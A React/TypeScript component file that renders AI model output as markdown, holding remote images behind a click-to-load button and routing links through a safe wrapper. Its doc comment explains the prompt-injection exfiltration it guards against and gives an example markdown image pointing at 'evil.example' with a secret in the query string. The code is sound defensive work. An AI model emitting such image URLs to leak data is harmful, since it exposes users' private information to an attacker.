import React, { useState } from "react";
import { ExternalLink } from "./env";

/** Images the model writes into markdown load only on click. Loading one sends a request to
 * whoever hosts it, and a prompt-injected reply could hide data in that URL
 * (`![](https://evil.example/?d=secret)`). Local and inline images load as usual. */
export function SafeImage({ src, alt }: { src?: string; alt?: string }) {
  const url = String(src || "");
  const local = url.startsWith("data:image/") || url.startsWith("blob:") || url.startsWith("/") || /^https?:\/\/(127\.0\.0\.1|localhost)(:\d+)?\//.test(url);
  const [shown, setShown] = useState(local);
  if (!/^(https?:|data:image\/|blob:|\/)/.test(url)) return <span>{alt || ""}</span>;
  if (shown) return <img src={url} alt={alt || ""} loading="lazy" referrerPolicy="no-referrer" style={{ maxWidth: "100%" }} />;
  let host = "";
  try {
    host = new URL(url).host;
  } catch {
    host = "another site";
  }
  return (
    <button type="button" className="es-btn es-btn-sm" onClick={() => setShown(true)} title={url}>
      Show image{alt ? ` “${alt}”` : ""} from {host}
    </button>
  );
}

/** react-markdown overrides for model output: safe links, click-to-load images. */
export const safeMarkdownComponents = {
  a: ({ href, children }: { href?: string; children?: React.ReactNode }) => <ExternalLink href={String(href || "")}>{children}</ExternalLink>,
  img: ({ src, alt }: { src?: string; alt?: string }) => <SafeImage src={src} alt={alt} />,
};
